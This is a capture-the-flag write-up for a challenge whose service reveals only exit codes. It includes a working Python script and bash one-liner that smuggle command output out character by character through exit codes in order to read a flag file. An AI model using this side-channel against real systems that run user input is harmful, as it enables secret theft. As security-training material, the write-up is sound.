# Awkward

When we connect, if we try to enter anything, it sends {number}..well this is awkward..

This reminded me of a TAMU ctf chall I did long ago, there you could send commands but you only got the exit codes. Typing stuff like "llgltltltl" gave an output of 127, which is the command not found exit code. I tried "ls", and this gave 0 - indicating that these were probably exit codes. The key was to somehow communicate information via exit codes and exit codes alone.

With a combination of bash commands, we can accomplish this.

Firstly, var1=$\(command\). Simple, just sets a variable to the output of this command.

Exit codes can be between 0 and 255. This is enough to communicate one byte at a time.

var2=$\(echo $var1 \| cut -c number\) this will grab a certain character of var1 using the bash command cut, and store it in var2.

Finally, exit $\(echo -n $var2 \| od -An -tuC\) - echo -n $var2 \| od -An -tuC will grab the ascii value of the character that var2 represents, plocking exit before this means that the output of this command chain will become the argument for exit, communicating our character via the exit code.

I wrote a simple loop to automate this and get the full output of a command.

```python
import socket
import re
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('jh2i.com',50025))
def getcmdoutput(cmd):
    global s
    s.send(cmd.encode() + b'\n')
    output = s.recv(1024).decode()
    code = re.findall("(.*)... Well this is awkward...",output)[0]
    return int(code)
base = "cat this_is_where_the_flag_is_plz_dont_bruteforce/flag.txt"
output = ""
for i in range(60):
    command = "var1=$({});var2=$(echo $var1 | cut -c {});exit $(echo -n $var2 | od -An -tuC)"
    command = command.format(base,i + 1)
    exitcode = getcmdoutput(command)
    print(command)
    output += chr(exitcode)
    print(output)
```

## Flag: flag{okay\_well\_this\_is\_even\_more\_awkward}

